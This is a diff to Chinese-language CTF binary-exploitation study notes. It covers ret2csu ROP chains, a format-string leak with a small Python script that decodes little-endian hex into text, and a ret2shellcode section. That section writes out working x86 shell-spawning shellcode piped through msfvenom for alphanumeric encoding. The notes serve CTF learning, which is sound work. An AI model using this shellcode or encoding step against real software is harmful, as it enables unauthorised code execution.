@@ -39,6 +39,30 @@ Canary存在ebp之前 其大小取决于程序的bit 0x04 0x08
 ### ret2csu
 
 + https://ctf-wiki.org/en/pwn/linux/user-mode/stackoverflow/x86/medium-rop/
-+ 1.查找利用gadgets ![1709018072974](image/pwn/1709018072974.png)![1709018199735](image/pwn/1709018199735.png)
++ 1.查找利用gadgets
+  + ![1709018072974](image/pwn/1709018072974.png)![1709018199735](image/pwn/1709018199735.png)
 + 2.给寄存器赋值 按照64的参数顺序![1709018264113](image/pwn/1709018264113.png)
 + 3.泄露write地址 使得程序重新运行main函数，根据libc基地址计算system函数和binsh字符串的真实地址，构造ROP链![1709018463535](image/pwn/1709018463535.png)
+
+### ret2shellcode
+
++ http://shell-storm.org/shellcode/files/shellcode-819.html
++ b64shellcode编码的buf执行
+  + `python -c ``'import sys; sys.stdout.write("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'` `| msfvenom -p - -e x86``/alpha_mixed` `-a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload`
+  + BSides San Francisco CTF 2017-b_64_b_tuff
+
+### fmt
+
++ 查找溢出位置相对于flag变量的位置 计算出偏移
++ %偏移%s 泄露偏移地址上的值作为string类型输出
++ 小大端序问题
++ ```python
+  nums=["657b46544353534e","2d34653333386238","3165342d65313936","622d383534382d30",
+  "6565306232346663","7d363731"]
+  for strs in nums:
+      i = len(strs)-2
+      while i >= 0:
+          num = strs[i:i+2]
+          print(chr(int(num,16)),end="")
+          i = i-2
+  ```
